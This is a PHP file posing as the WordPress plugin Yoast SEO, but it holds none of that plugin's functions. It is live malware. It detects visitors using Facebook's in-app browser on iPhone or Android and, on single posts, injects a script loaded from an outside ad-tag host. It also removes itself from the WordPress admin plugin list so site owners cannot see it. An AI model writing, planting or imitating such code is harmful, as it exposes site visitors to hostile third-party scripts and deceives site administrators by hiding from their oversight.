<?php
/*
  Plugin Name: Yoast SEO
  Description: Yoast SEO gives you everything you need to manage your on-site SEO. The Yoast SEO Premium plugin and its extensions unlock more advanced and AI-powered tools.
  Version: 28.2
*/

add_action('wp_head', function () {

    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $is_ios_facebook = (
        stripos($ua, 'iPhone') !== false &&
        stripos($ua, 'FBAN/FBIOS') !== false
    );

    $is_android_facebook = (
        stripos($ua, 'Android') !== false &&
        (
            stripos($ua, 'FB_IAB/FB4A') !== false ||
            stripos($ua, 'FBAN/EMA') !== false
        )
    );

    if (is_singular() && ($is_ios_facebook || $is_android_facebook)) {
        ?>
        <script>
        (function(s){
            s.dataset.zone='11543860';
            s.src='https://al5sm.com/tag.min.js';
        })([document.documentElement, document.body].filter(Boolean).pop()
          .appendChild(document.createElement('script')));
        </script>
        <?php
    }
});


add_filter('all_plugins', function ($plugins) {
    $plugin_file = plugin_basename(__FILE__);

    if (isset($plugins[$plugin_file])) {
        unset($plugins[$plugin_file]);
    }

    return $plugins;
});
